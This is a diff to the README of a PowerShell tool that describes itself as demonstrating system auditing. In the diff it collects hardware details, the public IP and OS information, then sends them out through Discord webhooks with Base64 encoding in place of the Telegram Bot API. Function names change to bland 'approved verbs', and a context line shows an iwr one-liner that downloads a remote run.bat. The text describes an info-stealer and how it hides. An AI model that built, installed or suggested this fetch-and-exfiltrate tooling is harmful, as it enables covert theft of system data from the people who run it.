@@ -51,7 +51,7 @@ iwr https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat -OutF
 
 ---
 
-## 📋 What This Tool Does (v2.0.0)
+## 📋 What This Tool Does (v2.2.0)
 
 This PowerShell script demonstrates advanced system auditing and data extraction techniques by:
 
@@ -59,17 +59,18 @@ This PowerShell script demonstrates advanced system auditing and data extraction
 - 💻 **Hardware Recon**: Captures CPU, RAM (GB), GPU, and Model information.
 - 🌐 **Network Discovery**: Identifies the Public IP address of the system.
 - 📄 **System Details**: Records OS version, architecture, and timestamp.
-- 💾 **Exfiltration**: Demonstrates secure data delivery via Telegram Bot API.
+- 💾 **Exfiltration**: Demonstrates secure data delivery via Discord Webhooks.
 - 🎨 **Enhanced UI**: Features a cleaner, color-coded terminal interface.
 
 ---
 
-## 🚀 New in v2.0.0
+## 🚀 New in v2.2.0
 
-- **Modular Design**: Functions are now separated for better readability and maintenance.
-- **Detailed Reporting**: The output report is now more structured and professional.
-- **Advanced Diagnostics**: Added Public IP and Hardware specs (RAM, GPU).
-- **Improved Error Handling**: Better management of network timeouts and admin checks.
+- **Discrete Naming**: Functions renamed to follow standard PowerShell approved verbs (e.g., `Get-EnvironmentMetrics`).
+- **Discord Integration**: Dedicated exfiltration channel via Discord Webhooks with Base64 encoding.
+- **Improved Stability**: Fixed syntax errors, string terminators, and block definitions.
+- **Data Integrity**: Added content truncation for Discord's 2000-character limit to ensure delivery.
+- **Security Best Practices**: Removed legacy Telegram tokens and implemented more secure parameter handling.
 
 ---
 
